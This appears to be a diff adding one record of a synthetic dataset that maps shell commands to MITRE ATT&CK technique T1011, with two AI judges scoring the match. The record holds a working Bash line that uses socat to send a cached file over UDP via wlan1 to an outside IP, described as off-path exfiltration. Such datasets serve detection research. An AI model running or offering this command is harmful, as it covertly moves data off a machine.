@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && socat -u FILE:/home/user/.cache/k.bin UDP4-SENDTO:10.55.88.7:49401,interface=wlan1",
+  "explanation": "Uses socat to send a file via UDP bound explicitly to wlan1, leveraging a separate wireless medium in line with T1011.",
+  "rationale_steps": [
+    "Confirm wlan1 presence via iwconfig without making changes.",
+    "Select the outbound interface explicitly (wlan1) to ensure off-path exfiltration.",
+    "Use UDP on a non-standard port for a single-shot transfer with minimal system impact."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-c920e182",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed command with proper redirections, chaining via &&, and valid socat address syntax.",
+        "semantic_score": 2,
+        "semantic_justification": "Although it sends a file via UDP, binding to wlan1 with 'interface=' is questionable or privilege-dependent and the operation is a straightforward transfer rather than covert traffic signaling per the described technique.",
+        "combined_score": 3.5,
+        "confidence": 0.66,
+        "timestamp": "2025-10-01T14:32:08.078329Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for `bash`, `iwconfig`, and `socat`, including redirections and address specifications.",
+        "semantic_score": 5,
+        "semantic_justification": "The `socat` command perfectly aligns with T1011 by sending a payload (from `k.bin`) via UDP specifically over the `wlan1` interface, which is a direct method of traffic signaling over a distinct medium as described.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T14:32:30.309320Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.5,
+    "llm_average_score": 4.25,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
